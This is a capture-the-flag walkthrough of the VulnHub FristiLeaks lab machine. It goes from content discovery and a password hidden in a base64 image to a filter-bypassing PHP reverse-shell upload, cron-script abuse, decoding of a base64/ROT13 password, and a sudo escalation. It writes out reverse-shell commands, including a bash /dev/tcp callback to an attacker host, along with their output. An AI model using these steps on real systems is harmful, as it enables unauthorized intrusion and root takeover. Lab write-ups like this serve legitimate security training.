Fristileaks

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Image embeded in base64 encoding
[+] Admin portal with password in picture
[+] Bypass image file upload
[+] Abusing crontab script
[+] Base64 encryption with ROT13
[+] Privilege Escalation abusing SUDO right  - script
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-14 02:12 EDT
Nmap scan report for 192.168.56.106
Host is up (0.12s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Accessing robots.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# curl http://192.168.56.106/robots.txt
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to the website we find a reference to fristi
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Fristileaks/friski1.png)

Browsing to http://192.168.56.106/fristi we get an admin pannel with a base 64 encoded string in the source page.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/fristileaks# curl http://192.168.56.106/fristi/
<html>
<head>
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Fristileaks/friski2.png)



Decoding the base64 string we observe it starts with PNG. This must be a png file.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/fristileaks# echo 'iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==' | base64 -d
�PNG
�
IHDRm4�A�sRGB���gAMA��
                      �a	pHYs���o�dRIDATx^��Qv� �a��
                                                         �z��l&�I%KH�@f45�5��VI
                                                                               ���s��~���E��"Gx�#��^/r�9���E��"Gx�#��^/r�9���E��"Gx�#��^/�����&������T3h��#3՗j�
                                                                               ��~̓�ݿ~��2�Z�e��L������ZZUW$�o��y���{K}�f�P���9{�6�X��KKL>���a�%�ZD�
                                                                  �Ś�B��5o�:�å��'��*�̥%&��Rxg�յ���V3]��#q�pz�R�\Zb�	-]�յ���JH5�9r(����I5se��G�tXq"k�6���j�
                                ���6��                                        �gF��n�T3W��ג���ߞ���j�ʯ��JH5Ӆx�D7(
                    ��ߠ�MI6�������D3�
                                     ������M���JH5ӅZ�l3�GY�d��Mo6��T�rR͘�
                                                                        ����ZZ��=�#;t����T_��>Trd��+?���8�7�j-�}d��R�t!�#�[/r�9���E��"Gx�#��^/r�9���E��"Gx�#��/r�9���E��"Gx�#��^/r�9���E�����Z�8�֫rqIEND�B`�
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We send the decoded string into a png file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/fristileaks# caecho 'iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg==' | base64 -d > image.png

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


The file image.png

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Fristileaks/friski3.png)

Trying user eezeepz and the password keKkeKKeKKeKkEkkEk we were able to login.

We found a feature to upload a file to the server. 
We upload a php-reverse-shell.php
Due to the fact that there is filter on the server that prevents us from uploading php files, we are sending the file through burp

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Fristileaks/friski4.png)

The filter is bypassed and the file is uploaded in the /uploads folder

Starting a listener on port 1234

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/fristileaks# curl http://192.168.56.106/fristi/uploads/php-reverse-shell.php.jpg

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/fristileaks# nc -vnlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.106] 41915
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 02:51:18 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.1$ iidd

uid=48(apache) gid=48(apache) groups=48(apache)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Going to eezeepz home directory we found this note

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.1$ pwd
/home/eezeepz
bash-4.1$ cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Accessing /home/admin

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.1$ echo '/home/admin/chmod -R 777 /home/admin/' >> /tmp/runthis
bash-4.1$ cd /home/admin
bash-4.1$ ls
cat    cronjob.py	cryptpass.py  echo   grep  whoisyourgodnow.txt
chmod  cryptedpass.txt	df	      egrep  ps

bash-4.1$ cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG

bash-4.1$ cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

bash-4.1$ cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We have the cryptpass.py and the cryptedpass.txt
We get the password by modifying the script

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Fristileaks/friski5.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/fristileaks# python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
LetThereBeFristi!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Esclation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.1$ su fristigod
Password: LetThereBeFristi!

bash-4.1$ id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.1$ sudo -l
[sudo] password for fristigod: bash-4.1$ su fristigod
Password: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Looking for files on fristigod


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.1$ find / -user fristigod 2>/dev/null
... snip...

/home/fristigod/.bash_logout
/home/fristigod/.bashrc
/home/fristigod/.bash_profile
/var/spool/mail/fristigod
/var/fristigod
/var/fristigod/.bash_history
/var/fristigod/.secret_admin_stuff

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


History offeres a solution on how to get root privileges




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.1$ cat /var/fristigod/.bash_history
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom 
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom 
sudo -u fristi ./doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Starting a reverse shell on kali on port 8081.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash -i >& /dev/tcp/192.168.56.102/8081 0>&1
[sudo] password for fristigod: LetThereBeFristi!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 8081
listening on [any] 8081 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.106] 33817
id
bash-4.1# id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~











